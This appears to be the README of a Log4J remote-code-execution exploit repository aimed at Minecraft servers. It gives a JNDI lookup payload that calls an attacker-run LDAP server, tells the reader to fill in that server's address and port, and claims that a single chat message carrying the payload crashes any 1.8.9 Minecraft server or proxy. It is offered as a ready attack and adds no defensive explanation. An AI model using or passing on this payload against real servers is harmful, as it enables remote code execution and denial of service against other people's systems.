# Log4J-RCE-Implementation

Basically run this (replacing the ip and port to the server in this repo):
${jndi:ldap://127.0.0.1:3710/a}

For now, this is capable of crashing any MC server or proxy

Sending a single chat message "${jndi:ldap://192.168.1.123:3710/owo}" on any 1.8.9 server will crash.



https://github.com/pimps/CVE-2017-5645/blob/master/log4j%20advisory.txt
